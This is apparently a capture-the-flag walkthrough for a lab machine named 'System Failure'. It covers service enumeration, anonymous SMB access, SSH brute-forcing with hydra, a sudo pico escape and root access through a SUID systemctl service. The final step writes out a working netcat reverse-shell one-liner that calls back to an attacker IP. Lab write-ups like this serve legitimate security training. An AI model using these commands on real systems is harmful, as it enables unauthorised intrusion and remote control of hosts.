# System Failure (Creatigon Basic Pentest)

---

## Enumeration

- Nmap Enumeration

1. 21/ftp vsftpd 3.0.3
2. 22/ssh syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
3. 80/http syn-ack Apache httpd 2.4.38 ((Debian))
   - server-header - Apache/2.4.38 (Debian)
4. 139/samba samba
5. 445/samba samba

- Initial Testing

1. ftp -> cannot enter anonymous login
2. smb

```sh
$ smbmap -H $IP
# anonymous -> read, write
# IPC$, print$ -> no access
```

- get share file in smb anonymous share
- login creds for FTP - 89492D216D0A212F8ED54FC5AC9D340B (`qazwsxedc`)
- enum4linux - interesting results

```
S-1-22-1-1000 Unix User\valex (Local User)
S-1-22-1-1001 Unix User\admin (Local User)
S-1-22-1-1002 Unix User\jin (Local User)
S-1-22-1-1003 Unix User\superadmin (Local User)

```

3. http

- directory brute forcing ->
  - http://$IP/area4

---

## Enter user account

- Enter ftp accounts with above password, and it is admin's account
- it is also work for admin's ssh account
- no sudo
- run linpeas at /tmp folder (saved as lp_outu.ansi)
- interesting results

```
SUID -> systemctl
https://gtfobins.github.io/gtfobins/systemctl/#suid

# file: /usr/bin/systemctl
USER   root      rwx
GROUP  root      ---
group  jin       r-x
mask             r-x
other            ---

/home/admin/Syst3m/here.txt
(I l3f7 y0u 0ur s3cr3t c0d3)+(I l3f7 17 ju57 f0r y0u)+(t0 m4k3)x(7h1ng5 s4f3r.)
I left you our secret code. I left if just for you to make things safer.
```

- in /home/admin/Syst3m/F4iluR3/

  - all files has length 1696 except fle0189.txt has length 1714
  - diff -> J310MIYla1aVUaSV

- no user with no password with that word
- until now, we get users

```
admin
superadmin
valex
jin
```

- try to login with -e nsr with hydra (null password, login as pass, name reverse)

```sh
$ hydra -L users.txt $IP ssh -e nr
login: valex   password: xelav
```

- enter valex ssh

```sh
$ sudo -l
User valex may run the following commands on SystemFailure:
    (jin) NOPASSWD: /usr/bin/pico
```

- can run sudo pico as jin user

```sh
$ sudo -u jin pico
# then ctrl+R, ctrl+X
$ reset; sh 1>&0 2>&0
# become jin user
$ /bin/bash
```

- jin can run systemctl as root
- listen on your attack machine as

```
nc -nvlp 4242
```

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.25 4242 >/tmp/f"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

- get root access at attack machine

---
